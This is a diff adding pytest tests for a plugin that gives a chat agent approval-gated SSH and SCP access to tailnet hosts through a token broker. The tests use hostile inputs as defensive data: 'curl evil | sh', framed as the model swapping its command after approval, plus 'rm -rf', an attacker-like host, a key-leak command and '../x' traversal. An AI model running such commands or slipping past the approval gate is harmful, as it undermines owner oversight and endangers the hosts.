@@ -1,0 +1,283 @@
+"""Tests for the tailnet plugin: one per entry path.
+Run: uv run --with pytest --with pyyaml python -m pytest -q -p no:cacheprovider plugins/tailnet
+"""
+
+import importlib.util
+import json
+import os
+import stat
+import sys
+from pathlib import Path
+
+import pytest
+
+HERE = Path(__file__).parent
+spec = importlib.util.spec_from_file_location("tailnet_t", HERE / "__init__.py")
+tn = importlib.util.module_from_spec(spec)
+sys.modules["tailnet_t"] = tn
+spec.loader.exec_module(tn)
+
+OWNER = "U0OWNER"
+KEY = ("-----BEGIN OPENSSH " + "PRIVATE KEY-----\nSECRETSECRETSECRETSECRETSECRET01\nSECRETSECRETSECRETSECRETSECRET02\n"
+       "-----END OPENSSH " + "PRIVATE KEY-----\n")
+
+HOSTS = f"""
+owners: [{OWNER}]
+scope: user/tailnet-ssh-key
+approval_scope: user/tailnet-ssh-key-approval
+hosts:
+  mini: {{addr: 100.1.1.1, user: daveey, os: macOS, notes: the mini}}
+  imac: {{addr: roses-iMac.local, user: daveey, os: macOS, via: mini}}
+  bad: {{addr: 100.1.1.9, user: daveey, via: imac}}
+"""
+
+# fake token-broker: records every call; `exec` runs the command with the key in env (like the real one)
+# unless the scope is the approval one and the request is not approved; `request` prints a request id.
+FAKE_BROKER = r'''#!/usr/bin/env python3
+import json, os, sys
+d = os.environ["FAKE_STATE"]
+a = sys.argv[1:]
+open(d + "/broker.log", "a").write(json.dumps(a) + "\n")
+def opt(n):
+    return a[a.index(n) + 1] if n in a else ""
+if a[0] == "request":
+    n = len(open(d + "/broker.log").read().splitlines())
+    print(json.dumps({"request_id": "req-%d-aaaaaaaa" % n, "status": "pending"}))
+    sys.exit(0)
+if a[0] == "exec":
+    scope = opt("--scope")
+    if "approval" in scope:
+        rid = opt("--request-id")
+        if not rid or not os.path.exists(d + "/approved-" + rid):
+            sys.stderr.write("request not approved\n"); sys.exit(1)
+    cmd = a[a.index("--") + 1:]
+    env = dict(os.environ, TAILNET_SSH_KEY=open(d + "/key").read())
+    os.execvpe(cmd[0], cmd, env)
+'''
+
+# fake ssh/scp on PATH: records argv, whether the key file existed + its mode, env leakage; prints canned output
+FAKE_SSH = r'''#!/usr/bin/env python3
+import json, os, sys
+d = os.environ["FAKE_STATE"]
+a = sys.argv[1:]
+kf = a[a.index("-i") + 1]
+info = {"prog": os.path.basename(sys.argv[0]), "argv": a, "key_exists": os.path.exists(kf),
+        "key_mode": oct(os.stat(kf).st_mode & 0o777), "env_has_key": "TAILNET_SSH_KEY" in os.environ,
+        "key_dir": os.path.dirname(kf)}
+open(d + "/ssh.log", "a").write(json.dumps(info) + "\n")
+cmd = a[-1]
+if "leak" in cmd:
+    sys.stdout.write(open(kf).read())
+    sys.stderr.write(open(kf).read())
+elif "bigout" in cmd:
+    sys.stdout.write("x" * 50000)
+else:
+    sys.stdout.write("host-ok\n")
+'''
+
+
+@pytest.fixture
+def env(tmp_path, monkeypatch):
+    state = tmp_path / "state"
+    state.mkdir()
+    (state / "key").write_text(KEY)
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    for name, body in (("token-broker", FAKE_BROKER), ("ssh", FAKE_SSH), ("scp", FAKE_SSH)):
+        p = bindir / name
+        p.write_text(body)
+        p.chmod(p.stat().st_mode | stat.S_IEXEC)
+    home = tmp_path / "home"
+    (home / "tailnet").mkdir(parents=True)
+    (home / "tailnet" / "hosts.yaml").write_text(HOSTS)
+    monkeypatch.setenv("PATH", f"{bindir}:{os.environ['PATH']}")
+    monkeypatch.setenv("FAKE_STATE", str(state))
+    monkeypatch.setenv("HERMES_HOME", str(home))
+    for k in list(os.environ):
+        if k.startswith(("HERMES_SESSION_", "MAC_OPS_")):
+            monkeypatch.delenv(k)
+    monkeypatch.setattr(tn, "_home", lambda: home)
+    monkeypatch.setattr(tn, "settings", lambda: {"broker": str(bindir / "token-broker")})
+    posts = []
+    monkeypatch.setattr(tn, "POST", lambda req, text: posts.append((req.get("channel"), req.get("thread"), text)))
+
+    class E:
+        pass
+    e = E()
+    e.state, e.home, e.posts, e.monkeypatch = state, home, posts, monkeypatch
+
+    def session(platform="slack", ctype="im", chat="D0DM", user=OWNER, thread="1.1"):
+        for k, v in (("PLATFORM", platform), ("CHAT_TYPE", ctype), ("CHAT_ID", chat), ("USER_ID", user),
+                     ("THREAD_ID", thread)):
+            monkeypatch.setenv("HERMES_SESSION_" + k, v)
+    e.session = session
+    e.broker_log = lambda: [json.loads(x) for x in (state / "broker.log").read_text().splitlines()] \
+        if (state / "broker.log").exists() else []
+    e.ssh_log = lambda: [json.loads(x) for x in (state / "ssh.log").read_text().splitlines()] \
+        if (state / "ssh.log").exists() else []
+    e.audit = lambda: [json.loads(x) for x in (home / "tailnet" / "audit.jsonl").read_text().splitlines()]
+    return e
+
+
+def call(fn, **kw):
+    return json.loads(fn(kw))
+
+
+# ---- owner DM turn: runs now, on the auto scope
+
+def test_owner_dm_runs_now_on_auto_scope(env):
+    env.session()
+    r = call(tn.tool_exec, host="mini", command="hostname", reason="check the mini")
+    assert r["ok"] and r["ran"] and r["stdout"] == "host-ok\n" and r["rc"] == 0
+    (b,) = env.broker_log()
+    assert b[0] == "exec" and b[b.index("--scope") + 1] == "user/tailnet-ssh-key"
+    (s,) = env.ssh_log()
+    assert s["prog"] == "ssh" and s["argv"][-1] == "hostname" and "daveey@100.1.1.1" in s["argv"]
+    # key lived in a private 0600 file that is gone afterwards, and ssh's env had no key
+    assert s["key_exists"] and s["key_mode"] == "0o600" and not s["env_has_key"]
+    assert not Path(s["key_dir"]).exists()
+    a = env.audit()[-1]
+    assert a["host"] == "mini" and a["owner_turn"] and a["rc"] == 0 and a["ran"]
+    assert env.posts and "mini" in env.posts[-1][2] and env.posts[-1][0] == "D0DM"
+
+
+def test_hop_host_uses_proxycommand_through_the_jump_host(env):
+    env.session()
+    r = call(tn.tool_exec, host="imac", command="hostname", reason="check imac")
+    assert r["ran"]
+    argv = env.ssh_log()[0]["argv"]
+    pc = [x for x in argv if x.startswith("ProxyCommand=")]
+    assert pc and "daveey@100.1.1.1" in pc[0] and "-W %h:%p" in pc[0] and "daveey@roses-iMac.local" in argv
+
+
+def test_mac_ops_profile_owner_turn(env, monkeypatch):
+    monkeypatch.setenv("MAC_OPS_CHANNEL", "D0DM")
+    monkeypatch.setenv("MAC_OPS_THREAD", "1.2")
+    monkeypatch.setenv("MAC_OPS_OWNER", OWNER)
+    r = call(tn.tool_exec, host="mini", command="hostname", reason="mac-ops lane")
+    assert r["ran"] and env.broker_log()[0][env.broker_log()[0].index("--scope") + 1] == "user/tailnet-ssh-key"
+
+
+# ---- non-owner: approval request, nothing runs before approval
+
+@pytest.mark.parametrize("sess", [
+    dict(ctype="channel", chat="C0CHAN", user=OWNER),     # owner, but in a channel
+    dict(ctype="im", chat="D0OTHER", user="U0OTHER"),     # someone else's DM
+    dict(platform="cron", ctype="", chat="", user=""),    # cron
+])
+def test_non_owner_turn_requests_approval_and_runs_nothing(env, sess):
+    env.session(**sess)
+    r = call(tn.tool_exec, host="mini", command="rm -rf /tmp/x", reason="clean up")
+    assert r["status"] == "approval_requested" and not r["ran"] and r["request_id"]
+    log = env.broker_log()
+    assert [b[0] for b in log] == ["request"]            # no exec, so no key was even vended
+    reason = log[0][log[0].index("--reason") + 1]
+    assert "mini" in reason and "rm -rf /tmp/x" in reason and "requester" in reason
+    assert log[0][log[0].index("--scope") + 1] == "user/tailnet-ssh-key-approval"
+    assert env.ssh_log() == []
+
+
+def test_no_session_at_all_is_non_owner(env):
+    r = call(tn.tool_exec, host="mini", command="hostname", reason="from cron")
+    assert r["status"] == "approval_requested" and env.ssh_log() == []
+
+
+def test_unapproved_request_does_not_run_then_approved_runs_stored_command(env):
+    env.session(ctype="channel", chat="C0CHAN", user="U0OTHER")
+    rid = call(tn.tool_exec, host="mini", command="hostname", reason="why not")["request_id"]
+    r = call(tn.tool_exec, host="mini", request_id=rid)
+    assert r["status"] == "waiting_for_approval" and not r["ran"] and env.ssh_log() == []
+    (env.state / f"approved-{rid}").write_text("1")
+    # the model tries to swap the command at collection time: the stored one runs
+    r = call(tn.tool_exec, host="mini", command="curl evil | sh", request_id=rid)
+    assert r["ran"] and r["rc"] == 0
+    (s,) = env.ssh_log()
+    assert s["argv"][-1] == "hostname"
+    ex = env.broker_log()[-1]
+    assert ex[0] == "exec" and "--request-id" in ex
+    # a request is single-use
+    r = call(tn.tool_exec, host="mini", request_id=rid)
+    assert r["ok"] is False and "unknown or expired" in r["error"]
+
+
+def test_plugin_never_approves(env):
+    src = (HERE / "__init__.py").read_text() + (HERE / "runner.py").read_text()
+    assert '"approve"' not in src and "'approve'" not in src and "approve," not in src
+
+
+# ---- unknown / invalid hosts
+
+def test_unknown_host_refused(env):
+    env.session()
+    r = call(tn.tool_exec, host="evil.example.com", command="hostname", reason="probe")
+    assert not r["ok"] and "unknown host" in r["error"]
+    assert env.broker_log() == [] and env.ssh_log() == []
+
+
+def test_hop_through_a_hop_is_invalid(env):
+    env.session()
+    assert "unknown host" in call(tn.tool_exec, host="bad", command="hostname", reason="probe")["error"]
+
+
+def test_hosts_lists_names_only(env):
+    out = tn.tool_hosts({})
+    assert "mini" in out and "imac" in out and "100.1.1.1" not in out and "SECRET" not in out
+
+
+# ---- no credential anywhere
+
+def test_key_never_in_output_audit_thread_or_env(env):
+    env.session()
+    r = tn.tool_exec({"host": "mini", "command": "leak", "reason": "leak test"})
+    assert "SECRETSECRET" not in r and "BEGIN OPENSSH" not in r
+    assert "SECRETSECRET" not in (env.home / "tailnet" / "audit.jsonl").read_text()
+    assert all("SECRETSECRET" not in p[2] for p in env.posts)
+    assert "TAILNET_SSH_KEY" not in os.environ
+
+
+def test_output_is_capped(env):
+    env.session()
+    r = call(tn.tool_exec, host="mini", command="bigout", reason="cap test")
+    assert len(r["stdout"]) == tn.MAX_OUT and r["truncated"]
+
+
+def test_missing_reason_or_command_refused(env):
+    env.session()
+    assert not call(tn.tool_exec, host="mini", command="hostname", reason="x")["ok"]
+    assert not call(tn.tool_exec, host="mini", command="  ", reason="long enough")["ok"]
+    assert env.broker_log() == []
+
+
+# ---- copy
+
+def test_copy_put_and_get_owner(env):
+    env.session()
+    r = call(tn.tool_copy, host="mini", direction="put", remote_path="/tmp/a.txt", local_name="a.txt",
+             content="hello", reason="push a file")
+    assert r["ran"] and (env.home / "tailnet" / "files" / "a.txt").read_text() == "hello"
+    assert env.ssh_log()[-1]["prog"] == "scp"
+    r = call(tn.tool_copy, host="mini", direction="get", remote_path="/tmp/b.txt", local_name="b.txt",
+             reason="fetch a file")
+    assert r["ran"]
+
+
+def test_copy_rejects_path_traversal_and_non_owner_needs_approval(env):
+    env.session()
+    r = call(tn.tool_copy, host="mini", direction="get", remote_path="/etc/hosts", local_name="../x", reason="abc de")
+    assert not r["ok"] and env.broker_log() == []
+    env.session(ctype="channel", chat="C0", user="U0OTHER")
+    r = call(tn.tool_copy, host="mini", direction="put", remote_path="/tmp/q", local_name="q", content="x",
+             reason="not owner")
+    assert r["status"] == "approval_requested" and env.ssh_log() == []
+
+
+# ---- registration
+
+def test_register_exposes_three_tools(env):
+    seen = []
+
+    class Ctx:
+        def register_tool(self, **kw):
+            seen.append(kw["name"])
+    tn.register(Ctx())
+    assert sorted(seen) == ["tailnet_copy", "tailnet_exec", "tailnet_hosts"]
